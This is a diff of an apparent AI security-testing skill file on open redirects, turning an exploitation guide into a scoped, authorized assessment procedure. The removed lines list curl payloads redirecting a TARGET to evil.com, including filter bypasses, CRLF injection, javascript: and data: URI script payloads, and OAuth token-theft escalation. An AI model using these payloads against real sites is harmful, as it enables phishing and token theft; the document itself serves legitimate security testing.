@@ -1,129 +1,78 @@
 ---
 name: attack-open-redirect
-description: "Open redirect exploitation — URL parameter manipulation, OAuth token theft, phishing chains"
+description: "Validate untrusted redirects, URL parser discrepancies, and security-relevant OAuth or login-flow impact"
 category: "web-application"
-version: "1.0"
-author: "cyberstrike-official"
-tags:
-  - open-redirect
-  - web
-  - phishing
-  - oauth
-  - attack
-tech_stack:
-  - web
-cwe_ids:
-  - CWE-601
-chains_with:
-  - attack-cors
-  - attack-jwt
-prerequisites: []
-severity_boost:
-  attack-jwt: "Open redirect + OAuth = JWT/token theft"
+version: "1.1.0"
+author: "CyberStrike contributors; consolidated with upstream attribution"
+tags: [open-redirect, web, oauth, url-validation, authentication]
+tech_stack: [http, browser, url, oauth]
+cwe_ids: [CWE-601]
+chains_with: [attack-cors, attack-jwt, attack-idor-automation, attack-triage-validation]
+prerequisites:
+  - "Authorized in-scope endpoint and controlled test identity"
+  - "A safe destination under your control or a local browser proof"
+sources:
+  - "https://github.com/elementalsouls/Claude-BugHunter/blob/main/skills/hunt-open-redirect/SKILL.md"
+  - "https://github.com/uphiago/recon-skills"
+  - "https://portswigger.net/kb/issues/00500100_open-redirection-reflected"
+  - "https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html"
 ---
 
-# Open Redirect
+# Open Redirect Assessment
 
 ## Objective
 
-Exploit URL redirect parameters to redirect users to attacker-controlled domains, steal OAuth tokens, or bypass security controls.
+Determine whether attacker-controlled input can navigate a browser or server-side workflow to an untrusted destination, and whether that behavior creates meaningful security impact. A generic redirect is often low impact; any claimed escalation must be independently demonstrated.
 
-## Testing Methodology
+## Scope and safety
 
-### Phase 1: Identify Redirect Parameters
+Use only in-scope URLs and a harmless destination you control. Do not collect credentials, authorization codes, tokens, or session data. Do not send phishing messages or expose real users to a redirect. Avoid payloads intended to execute script or inject response headers unless those exact tests are explicitly authorized.
 
-Common parameter names:
-```
-url, redirect, redirect_url, redirect_uri, return, return_url, returnTo,
-next, goto, target, dest, destination, rurl, redir, forward, continue,
-callback, path, out, view, login_url, image_url, go, link, ref
-```
+## Procedure
 
-### Phase 2: Basic Payloads
+### 1. Discover redirect sinks
 
-```bash
-# Direct redirect
-curl -s -D- "https://TARGET/redirect?url=https://evil.com"
+Review in-scope browser traffic, route parameters, form submissions, login/logout flows, email verification, OAuth/OIDC callbacks, and server responses containing `Location`. Common parameter names include `next`, `url`, `returnTo`, `redirect`, `continue`, `callback`, `target`, and `destination`; names alone are not proof.
 
-# Protocol-relative
-curl -s -D- "https://TARGET/redirect?url=//evil.com"
+### 2. Capture baseline behavior
 
-# Encoded
-curl -s -D- "https://TARGET/redirect?url=https%3A%2F%2Fevil.com"
+Record the original request, status, `Location` header, browser destination, and expected allowed destinations. Follow redirects only when safe and within scope; first inspect the response without automatically following it.
 
-# Backslash bypass
-curl -s -D- "https://TARGET/redirect?url=https://evil.com\@TARGET"
+### 3. Test URL validation
 
-# At-sign bypass
-curl -s -D- "https://TARGET/redirect?url=https://TARGET@evil.com"
-```
+With a benign external destination, test one representation at a time: absolute URL, protocol-relative URL, encoded value, and a controlled lookalike host. If the application uses allowlists, check whether validation parses the canonical hostname and scheme rather than relying on substring/prefix matching. Avoid CRLF, script schemes, data URLs, and other injection classes unless separately authorized and necessary.
 
-### Phase 3: Filter Bypass
+### 4. Check nested and indirect flows
 
-```bash
-# Subdomain matching
-curl -s -D- "https://TARGET/redirect?url=https://TARGET.evil.com"
+Inspect whether redirects occur after login, logout, password recovery, email verification, or OAuth/OIDC authorization. For OAuth, confirm the identity provider's exact redirect URI validation and the final callback behavior using only a test client and account. Do not attempt to capture a real user's authorization code or token.
 
-# URL encoding tricks
-curl -s -D- "https://TARGET/redirect?url=https://evil.com%23.TARGET"
+### 5. Validate chained impact independently
 
-# Double encoding
-curl -s -D- "https://TARGET/redirect?url=https://%65%76%69%6c.com"
+- **OAuth/token exposure:** only claim it when a controlled flow demonstrates that a credential or code crosses an unintended trust boundary, without collecting real-user secrets.
+- **CORS:** route browser cross-origin read questions to `attack-cors`.
+- **SSRF:** a server-followed URL is a separate hypothesis and belongs in `attack-ssrf`.
+- **XSS:** a script URL or HTML injection is a separate vulnerability class and must be validated separately.
+- **Account takeover:** do not claim ATO from an open redirect alone.
 
-# Null byte
-curl -s -D- "https://TARGET/redirect?url=https://evil.com%00.TARGET"
+### 6. Confirm and stop
 
-# CRLF + Location header
-curl -s -D- "https://TARGET/redirect?url=%0d%0aLocation:%20https://evil.com"
+Verify the final browser destination and whether an external host is actually reached. If the app normalizes or rejects the URL, record the rejection. Stop if the flow could expose a real credential or affect a real user.
 
-# JavaScript scheme
-curl -s -D- "https://TARGET/redirect?url=javascript:alert(document.domain)"
+## Common false positives
 
-# Data URI
-curl -s -D- "https://TARGET/redirect?url=data:text/html,<script>alert(1)</script>"
-```
+- Redirecting to a relative path or allowlisted destination.
+- A reflected URL that never controls navigation.
+- A trusted hostname that is only a string prefix of an untrusted hostname.
+- A generic redirect described as token theft without proof of a token-bearing flow.
+- A redirect chain whose final destination is still validated by the browser or identity provider.
 
-### Phase 4: OAuth Token Theft
+## Evidence and output
 
-```bash
-# Test with OAuth tester
-attack_script oauth_tester "https://TARGET/oauth/authorize" \
-  --client-id CLIENT_ID \
-  --redirect-uri "https://TARGET/callback" \
-  --json-output
-```
+Capture the redacted request, response status, `Location` value, final destination, validation rule, test identity, and impact chain if one is demonstrated. Return `endpoint`, `parameter`, `destination_class`, `redirect_behavior`, `auth_flow`, `chain_evidence`, `impact`, `confidence`, and evidence references.
 
-If redirect_uri accepts attacker domain, the OAuth code/token is sent to the attacker.
+## Related skills
 
-### Phase 5: Impact Escalation
-
-- Redirect in login flow → credential phishing
-- Redirect in OAuth flow → token theft (P1)
-- Redirect in email verification → account takeover
-- Redirect + SSRF → internal access
-
-## What Constitutes a Finding
-
-| Finding | Severity |
-|---------|----------|
-| Open redirect + OAuth token theft | Critical (P1) |
-| Open redirect in login/auth flow | High (P2) |
-| Generic open redirect | Medium (P3) |
-| JavaScript scheme redirect (XSS) | High (P2) |
-
-## Evidence Requirements
-
-- URL with redirect parameter and payload
-- Response showing 302/301 to attacker domain
-- For OAuth: stolen authorization code/token
-- Location header value in response
-
-## Tools
-
-- `attack_script oauth_tester` — OAuth redirect_uri bypass testing
-- `curl` — manual redirect testing
-
-## References
-
-- [PortSwigger: Open Redirect](https://portswigger.net/kb/issues/00500100_open-redirection-reflected)
-- [OWASP: Unvalidated Redirects](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html)
+- `attack-jwt` and `attack-oauth` — token validation and OAuth flow boundaries.
+- `attack-cors` — cross-origin readable response.
+- `attack-ssrf` — server-side URL fetching.
+- `attack-triage-validation` — severity and false-positive checks.
